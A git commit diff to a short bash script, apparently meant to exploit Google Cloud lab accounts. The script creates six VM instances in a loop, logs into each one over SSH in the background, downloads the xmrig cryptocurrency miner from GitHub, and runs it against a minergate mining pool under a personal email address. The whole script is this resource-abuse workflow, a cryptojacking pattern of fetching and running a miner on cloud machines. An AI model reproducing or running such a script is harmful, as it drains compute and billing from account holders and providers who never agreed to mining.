1ae6ff24d6223b6b8b3b98280f81ef8a45595742
EL AAMRANI SOUFIANE <63312672+elaamranisoufiane@users.noreply.github.com>
2020-11-20 21:21:18 +0100

    Update code.sh

--- code.sh
+++ code.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
-
+ssh-keygen
 for a in 1 2 3 4 5 6
 do
-ssh-keygen
+
 gcloud compute instances create gcelab$a --machine-type n1-standard-2 --zone us-central1-c --image-family=ubuntu-2004-lts --image-project=ubuntu-os-cloud 
 sleep  10
 nohup gcloud compute ssh gcelab$a --zone=us-central1-c --ssh-key-file=/home/$USER/.ssh/id_rsa --command='wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-linux-x64.tar.gz && tar xvzf  xmrig-6.5.3-linux-x64.tar.gz && ./xmrig-6.5.3/xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u site.web97@gmail.com' &
